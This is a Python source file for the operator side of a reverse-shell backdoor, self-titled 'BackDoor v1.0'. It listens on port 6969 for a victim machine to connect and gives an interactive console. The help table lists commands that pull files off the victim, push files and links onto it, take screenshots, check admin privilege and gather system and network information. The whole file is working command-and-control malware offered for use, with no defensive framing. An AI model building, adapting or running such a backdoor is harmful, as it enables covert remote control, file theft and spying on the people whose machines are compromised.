import argparse
import base64
import json
import os
import platform
import socket
import sys

import tabulate
# import pickle
import tqdm


class Server:

    def __init__(self, parser):
        # Arguments
        self._parser = parser
        self._verbose = bool(self._parser.verbose)
        self._HOST = str(self._parser.address)
        self._PORT = int(self._parser.port)

        # Default values to Arguments
        if self._HOST == '':
            self._HOST = "0.0.0.0"

        if self._PORT == 0:
            self._PORT = 6969

        # Other
        self.__LOGO__ = r"""

     ______              _     _____
    (____  \            | |   (____ \
     ____)  ) ____  ____| |  _ _   \ \ ___   ___   ____
    |  __  ( / _  |/ ___) | / ) |   | / _ \ / _ \ / ___)
    | |__)  | ( | ( (___| |< (| |__/ / |_| | |_| | |
    |______/ \_||_|\____)_| \_)_____/ \___/ \___/|_|
                                v1.0 - by ZeaCeR#5641

        """

        if self._verbose:
            print("+ Starting to listen on " +
                  str(self._HOST) + ":" + str(self._PORT))

        # Main
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._count = 1
        self._server.bind((self._HOST, self._PORT))

        print(self.__LOGO__)
        print('+ Listening for incoming connections on ' +
              str(self._HOST) + ":" + str(self._PORT))

        self._server.listen(5)
        self.client, self.client_addr = self._server.accept()
        print('+ ' + str(self.client_addr) + ' connected to the server')

    def send(self, data):
        if self._verbose:
            print("+ Sending data of Length: " + str(len(data)))

        json_data = json.dumps(data)
        self.client.send(json_data.encode())

        if self._verbose:
            print("+ Sent data to client")

    def recv(self):
        if self._verbose:
            print("+ Starting to recieve data")

        data = b""
        count_recv = 1
        while True:
            try:
                data = data + self.client.recv(1024000)

                if self._verbose:
                    print("+ Added recieved data for the output string " +
                          str(count_recv) + " times")

                count_recv += 1

            except ValueError:
                break
            except Exception as e:
                print(e)
                break

        return_val = json.loads(data.decode())

        if self._verbose:
            print("+ Finished recieving data of total length")

        return return_val

    def send_file(self, filename):
        if self._verbose:
            print("+ Starting to send file")

        json_data = json.dumps(filename.decode())
        self.client.send(json_data.encode())

        if self._verbose:
            print("+ File sent")

    def recv_file(self):
        if self._verbose:
            print("+ Starting to recieve data")

        data = b""
        count_recv = 1
        while True:
            try:
                data = data + self.client.recv(1024000)

                if self._verbose:
                    print("+ Added recieved data for the output string " +
                          str(count_recv) + " times")

                count_recv += 1

            except ValueError:
                break
            except Exception as e:
                print(e)
                break

        return_val = json.loads(data.decode())

        if self._verbose:
            print("+ Finished recieving data of total length")

        return return_val

    def rshelp(self):
        headers = ('Command',
                   'Description')
        lister = [
            ('rsq', 'Quit the reverse shell in both client and server'),
            ('rshelp', 'Display this'),
            ('get <link>', 'Download a file to the client machine'),
            ('start <filepath>', 'Open a file'),
            ('download [filepath]', 'download file to server'),
            ('upload [filepath]', 'download file to client'),
            ('screenshot', 'take a screenshot of the client'),
            ('check', 'check for admin privilege'),
            ('info', 'get system info'),
            ('rsipconfig', 'get network information'),
            ('rspublicip', 'get the public IP address')
        ]
        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def shell(self):
        while True:
            command = input(f'[{self.client_addr}] %')
            self.send(command)

            if self._verbose:
                print(f'+ Running command: {command}')

            if command == "rsq":
                break

            elif command[:2] == "cd" and len(command) > 1:
                continue

            elif command[:8] == "download":
                with open(command[9:], "wb") as file:
                    result = self.recv_file()
                    file.write(base64.b64decode(result))
                    continue

            elif command[:6] == "upload":
                try:
                    with open(command[7:], "rb") as fin:
                        self.send_file(base64.b64encode(fin.read()))
                        continue
                except:
                    failed = "Failed to Upload"
                    self.send_file(base64.b64encode(failed))

            elif command[:10] == "screenshot":
                try:
                    with open("screenshot.png", "wb") as screen:
                        image = self.recv_file()
                        image_decoded = base64.b64decode(image)
                        if image_decoded[:4] == "[!!]":
                            print(image_decoded)
                        else:
                            screen.write(image_decoded)
                            self._count += 1
                except:
                    print("[!!] Failed to get screenshot")
                    continue

            elif command == "clear":
                if platform.system().lower().startswith("win"):
                    os.system("cls")
                else:
                    os.system("clear")

            elif command == "rshelp":
                self.rshelp()

                continue

            result = self.recv()
            print(result)


def main():
    parser = argparse.ArgumentParser(add_help=True)

    parser.add_argument('-v', '--verbose', dest="verbose",
                        default=False, action="store_true", help="Verbosity")

    parser.add_argument('-a', '--address', dest="address",
                        default="", type=str, help="Address to Bind to")

    parser.add_argument('-p', '--port', dest="port",
                        default=0, type=int, help="Port to Bind to")

    parser = parser.parse_args()
    print(parser)

    server = Server(parser=parser)
    server.shell()


if __name__ == "__main__":
    main()
